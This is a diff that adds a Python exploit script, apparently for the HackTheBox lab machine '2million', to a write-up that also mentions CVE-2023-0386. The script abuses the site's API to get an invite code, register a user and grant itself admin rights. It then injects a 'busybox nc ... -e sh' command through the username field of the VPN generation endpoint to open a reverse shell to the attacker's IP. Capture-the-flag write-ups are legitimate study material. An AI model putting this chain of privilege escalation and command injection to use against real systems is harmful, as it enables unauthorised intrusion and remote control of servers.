@@ -1033,3 +1033,87 @@ root@2million:~/CVE-2023-0386#
 
 ```
 
+
+`FOOTHOOLD`
+
+``` python
+
+import requests
+import base64
+import time
+
+url = "http://2million.htb"
+session = requests.Session()
+session.cookies.set("PHPSESSID","qjvqi985nqh19n0nm1bkk032dh")
+
+user = "test1234"
+password = "test1234"
+email = "test1234@test.com"
+payload = ";busybox nc 10.10.15.242 4444 -e sh;"
+
+try:
+   r = session.post(url + "/api/v1/invite/generate")
+   print(r.status_code)
+   data = r.json()
+   code = data["data"]["code"]
+   decoded = base64.b64decode(code)
+   print(decoded.decode())
+except Exception as e:
+   print(f"Error: {e}")
+   print("No se ha podido conseguir el condigo de invitacion")
+
+
+try:
+    data = {"code":decoded.decode(), "username":user, "email":email, "password":password, "password_confirmation":password}
+    r = session.post(url + "/api/v1/user/register", data=data)
+    print("[+] Creando user")
+    print(r.status_code)
+
+except Exception as e:
+    print(f"Error: {e}")
+
+time.sleep(3)
+
+try:
+    data = {"email":email, "password":password}
+    r = session.post(url + "/api/v1/user/login", data=data)
+    if r.status_code == 200:
+          print("Usuario logueado")
+          try:
+              r2 = session.get(url + "/api/v1/user/auth")
+              print(r2.text)
+          except Exception as e:
+                 print(f"Error: {e}")
+    else:
+          print("Error al iniciar session")
+
+except Exception as e:
+     print(f"Error: {e}")
+
+try:
+    data = {"email":email, "is_admin":1}
+    r = session.put(url + "/api/v1/admin/settings/update", json=data)
+    print("Escalando privilegios en la web...")
+    print(r.status_code)
+    print(r.text)
+    if r.status_code == 200:
+        print("Escalada de privilegios en la web completada")
+    else:
+        print("Escalada de privilegios no completada")
+
+except Exception as e:
+        print(f"Error: {e}")
+
+
+try:
+    print("Ejecutando comandos en el sistema objetivo")
+    print("Asegurate de estar a la escucha para reciber la shell")
+    time.sleep(5)
+    data = {"username": payload}
+    r = session.post(url + "/api/v1/admin/vpn/generate" , json=data)
+    print(r.status_code)
+    print(r.text)
+except Exception as e:
+     print(f"Error: {e}")
+
+```
